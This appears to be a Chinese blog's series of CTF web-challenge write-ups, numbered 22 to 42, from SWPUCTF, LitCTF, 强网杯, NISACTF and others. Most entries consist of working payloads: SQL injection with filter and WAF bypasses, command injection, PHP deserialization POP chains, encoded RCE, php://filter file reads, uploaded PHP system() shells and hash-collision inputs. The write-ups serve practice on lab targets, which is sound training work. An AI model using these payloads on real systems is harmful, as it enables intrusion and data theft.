<h1 id="22-SWPUCTF-2021-新生赛-hardrce"><a href="#22-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="22.[SWPUCTF 2021 新生赛]hardrce"></a>22.[SWPUCTF 2021 新生赛]hardrce</h1><p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+]your function: system</span><br><span class="line">[+]your command: cat /flllllaaaaaaggggggg</span><br><span class="line">[*] (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>

<h1 id="23-NCTF-2018-签到题"><a href="#23-NCTF-2018-签到题" class="headerlink" title="23.[NCTF 2018]签到题"></a>23.[NCTF 2018]签到题</h1><p>访问&#x2F;index.php 抓包，包头nctf2018栏即是flag</p>
<h1 id="24-SWPUCTF-2021-新生赛-pop"><a href="#24-SWPUCTF-2021-新生赛-pop" class="headerlink" title="24.[SWPUCTF 2021 新生赛]pop"></a>24.[SWPUCTF 2021 新生赛]pop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后需要调用GetFlag()，为此需要w33m中的<code>__toString</code>，令<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;=GetFlag</code>，w22m中的w00m可控。通过设置w33m的w00m为w44m赋值，为w33m赋值GetFlag，由于w44m成员属性非public，序列化串会有特殊字符，需要进行urlencode。exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m = <span class="string">&quot;GetFlag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22GetFlag%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<h1 id="25-LitCTF-2023-导弹迷踪"><a href="#25-LitCTF-2023-导弹迷踪" class="headerlink" title="25.[LitCTF 2023]导弹迷踪"></a>25.[LitCTF 2023]导弹迷踪</h1><p>F12</p>
<h1 id="26-SWPUCTF-2021-新生赛-sql"><a href="#26-SWPUCTF-2021-新生赛-sql" class="headerlink" title="26.[SWPUCTF 2021 新生赛]sql"></a>26.[SWPUCTF 2021 新生赛]sql</h1><p>绕过空格使用<code>/**/</code></p>
<p>绕过等号使用<code>like</code></p>
<p>payload1：</p>
<p><code>-1&#39;/**/order/**/by/**/3%23</code></p>
<p>payload2：</p>
<p><code>-1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</code></p>
<p>payload3：</p>
<p><code>-1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like(&#39;LTLT_flag&#39;)%23</code></p>
<p>payload4：</p>
<p><code>-1&#39;/**/union/**/select/**/1,mid(group_concat(id,flag),1,20),3/**/from/**/LTLT_flag%23</code></p>
<p>payload5：</p>
<p><code>-1&#39;/**/union/**/select/**/1,mid(group_concat(id,flag),21,40),3/**/from/**/LTLT_flag%23</code></p>
<p>payload6:</p>
<p><code>-1&#39;/**/union/**/select/**/1,mid(group_concat(id,flag),41,60),3/**/from/**/LTLT_flag%23</code></p>
<h1 id="27-GXYCTF-2019-Ping-Ping-Ping"><a href="#27-GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="27.[GXYCTF 2019]Ping Ping Ping"></a>27.[GXYCTF 2019]Ping Ping Ping</h1><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;`ls`</span><br><span class="line">127.0.0.1;`tac flag.php`</span><br></pre></td></tr></table></figure>



<h1 id="28-NSSCTF-2022-Spring-Recruit-ezgame"><a href="#28-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="28.[NSSCTF 2022 Spring Recruit]ezgame"></a>28.[NSSCTF 2022 Spring Recruit]ezgame</h1><p>F12</p>
<h1 id="29-LitCTF-2023-我Flag呢？"><a href="#29-LitCTF-2023-我Flag呢？" class="headerlink" title="29.[LitCTF 2023]我Flag呢？"></a>29.[LitCTF 2023]我Flag呢？</h1><p>F12</p>
<h1 id="30-鹤城杯-2021-EasyP"><a href="#30-鹤城杯-2021-EasyP" class="headerlink" title="30.[鹤城杯 2021]EasyP"></a>30.[鹤城杯 2021]EasyP</h1><p><code>$_SERVE[&#39;PHP_SELF&#39;]</code>的特性，根目录存在index.php，访问<code>http://localhost/</code>自动进入index.php，但地址栏不显示，但通过<code>$_SERVE[&#39;PHP_SELF&#39;]</code>可以获取index.php这个文件名，其实是获取一条路径，&#x2F;index.php</p>
<p>如果当前服务器路径是<code>/test/test1/index.php</code>那么<code>$_SERVE[&#39;PHP_SELF&#39;]</code>就会是<code>/test/test1/index.php</code></p>
<p><code>basename()</code>函数就是获取最后一个&#x2F;后面的东西</p>
<p>show_source可用show[source或show.source绕过</p>
<p><code>preg_match(&#39;/utils\.php\*$/i&#39;)</code>使用一个乱码的编码绕过，如%88</p>
<p>payload：<code>?/index.php/utils.php/%88?show.source=1</code></p>
<h1 id="31-LitCTF-2023-PHP是世界上最好的语言！！"><a href="#31-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="31.[LitCTF 2023]PHP是世界上最好的语言！！"></a>31.[LitCTF 2023]PHP是世界上最好的语言！！</h1><p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="32-SWPUCTF-2021-新生赛-finalrce"><a href="#32-SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="32.[SWPUCTF 2021 新生赛]finalrce"></a>32.[SWPUCTF 2021 新生赛]finalrce</h1><p>payload1：<code>l\s /|tee 1.txt</code>然后访问1.txt</p>
<p>payload2：<code>tac /flllll\aaaaaaggggggg|tee 1.txt</code></p>
<h1 id="33-NISACTF-2022-checkin"><a href="#33-NISACTF-2022-checkin" class="headerlink" title="33.[NISACTF 2022]checkin"></a>33.[NISACTF 2022]checkin</h1><p>选中N1SACTF会同时选中后面那部分，粘贴到url，并进行urlencode，cuishiyuan那部分也是一样</p>
<p>payload：<code>ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag!%E2%81%A9%E2%81%A6N1SACTF</code></p>
<h1 id="34-LitCTF-2023-1zjs"><a href="#34-LitCTF-2023-1zjs" class="headerlink" title="34.[LitCTF 2023]1zjs"></a>34.[LitCTF 2023]1zjs</h1><p>F12有个<code>.dist/index.mud.js</code>，访问，F12注释有<code> /f@k3f1ag.php</code>，访问，jsfuck直接在控制台输出flag</p>
<h1 id="35-鹏城杯-2022-简单包含"><a href="#35-鹏城杯-2022-简单包含" class="headerlink" title="35.[鹏城杯 2022]简单包含"></a>35.[鹏城杯 2022]简单包含</h1><p>脏数据绕过waf，提交大量参数</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="36-LitCTF-2023-Ping"><a href="#36-LitCTF-2023-Ping" class="headerlink" title="36.[LitCTF 2023]Ping"></a>36.[LitCTF 2023]Ping</h1><p>用POST传参，不要在前端传参</p>
<p>payload：<code>command=0.0.0.0;cat /flag&amp;ping=Ping</code></p>
<h1 id="37-LitCTF-2023-Follow-me-and-hack-me"><a href="#37-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="37.[LitCTF 2023]Follow me and hack me"></a>37.[LitCTF 2023]Follow me and hack me</h1><p>payload：<code>?CTF=Lit2023 POST:Challenge=i&#39;m_c0m1ng</code></p>
<h1 id="38-SWPUCTF-2022-新生赛-ez-ez-php"><a href="#38-SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="38.[SWPUCTF 2022 新生赛]ez_ez_php"></a>38.[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>payload：<code>/?file=php://filter/read=convert.base64-encode/resource=flag</code></p>
<h1 id="39-LitCTF-2023-作业管理系统"><a href="#39-LitCTF-2023-作业管理系统" class="headerlink" title="39.[LitCTF 2023]作业管理系统"></a>39.[LitCTF 2023]作业管理系统</h1><p>F12获取口令进入后台，新建flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;flag.php</p>
<h1 id="40-强网杯-2019-随便注"><a href="#40-强网杯-2019-随便注" class="headerlink" title="40.[强网杯 2019]随便注"></a>40.[强网杯 2019]随便注</h1><p>前置知识：</p>
<p><strong>show</strong>：</p>
<p>show databases;&#x2F;&#x2F;查数据库</p>
<p>show tables;&#x2F;&#x2F;查表名</p>
<p>show columns from table;&#x2F;&#x2F;查字段</p>
<p><strong>alter</strong>：</p>
<p>修改已知表的列（增加add、更改alter、change、撤销drop)</p>
<p>添加列</p>
<p><code>alter table &quot;table_name&quot; add &quot;column_name&quot; type;</code></p>
<p>删除列</p>
<p><code>alter table &quot;table_name&quot; drop &quot;column_name&quot; type;</code></p>
<p>改变列数据类型</p>
<p><code>alter talbe &quot;table_name&quot; alter column &quot;column_name&quot; type;</code></p>
<p>改列名</p>
<p><code>alter table &quot;table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;</code></p>
<p><code>alter talbe &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;</code></p>
<p><strong>SQL约束</strong>：</p>
<p>not-null指示某列不能存储NULL值</p>
<p><code>alter table persons modify age int not null;</code>设置not null约束</p>
<p><code>alter table person modify age int null;</code>取消null约束</p>
<p>primary key 指定主键，确保某列有唯一标识，每个表有且只有一个主键</p>
<p><code>alter table persons add age primary key (id)</code></p>
<p>unique 保证某列每行必须有唯一的值（可以有多个unique约束，只能有一个primary key约束）</p>
<p><code>alter table person add unique (id);</code></p>
<p>check 限制列中值的范围</p>
<p><code>alter table person add check (id&gt;0);</code></p>
<p>deafult 规定没有给列赋值时的默认值</p>
<p><code>alter table person alter city set default &#39;chengdu&#39;;//mysql</code></p>
<p><code>alter table person add constraint ab_c default &#39;chengdu&#39; for city;//SQL server / MS access</code></p>
<p>auto_increment 自动赋值</p>
<p>foreign key保证一个表中的数据匹配另一个表中值的参照完整性</p>
<p>payload1：</p>
<p><code>1&#39;;show tables;#</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;1919810931114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;words&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1&#39;;show columns from `1919810931114514`;#</code></p>
<p>其中存在flag</p>
<p>过滤了select，可以使用16进制编码查询语句，select * from <code>1919810931114514</code>，结果为<code>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</code></p>
<p>使用prepare from预处理语句，将会在执行时进行编码转换，execute用来执行，select可以在一条语句为多个变量赋值，set只能对一个变量赋值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="variable">@var1</span><span class="operator">=</span><span class="string">&#x27;y&#x27;</span>,<span class="variable">@var2</span><span class="operator">=</span><span class="string">&#x27;n&#x27;</span>#即可</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@var1</span><span class="operator">=</span><span class="string">&#x27;y&#x27;</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@var2</span><span class="operator">=</span><span class="string">&#x27;n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>set会触发waf：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code>，使用大小写绕过</p>
<p>最终payload：</p>
<p><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></p>
<p>解法2：rename将wors改为其他表名，将1919…表名改为wors，给words表添加新的列名id，将flag改名data</p>
<p>payload：</p>
<p><code>1&#39;;rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigend not Null auto_increment primary key;alter table words change flag data varcahr(100);# </code></p>
<p>解法3：使用handler</p>
<p>payload：</p>
<p><code>1&#39;;handler `1919810931114514` open as `a`; handler `a` read next;#</code></p>
<h1 id="41-UUCTF-2022-新生赛-websign"><a href="#41-UUCTF-2022-新生赛-websign" class="headerlink" title="41.[UUCTF 2022 新生赛]websign"></a>41.[UUCTF 2022 新生赛]websign</h1><p>禁用了F12、Ctrl+U、右键，直接抓包</p>
<h1 id="42-NISACTF-2022-level-up"><a href="#42-NISACTF-2022-level-up" class="headerlink" title="42.[NISACTF 2022]level-up"></a>42.[NISACTF 2022]level-up</h1><p>&#x2F;robots.txt-&gt; level_2_1s_h3re.php</p>
<p>md5强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>hackbar无法传参会报错url malformed，需要使用bp -&gt;Level___3.php</p>
<p>sha1，同时也是payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<p>-&gt;level_level4.php</p>
<p>_被过滤可以用+或者[替代，payload：<code>?NI+SA+=txw4ever</code>-&gt;55_5_55.php</p>
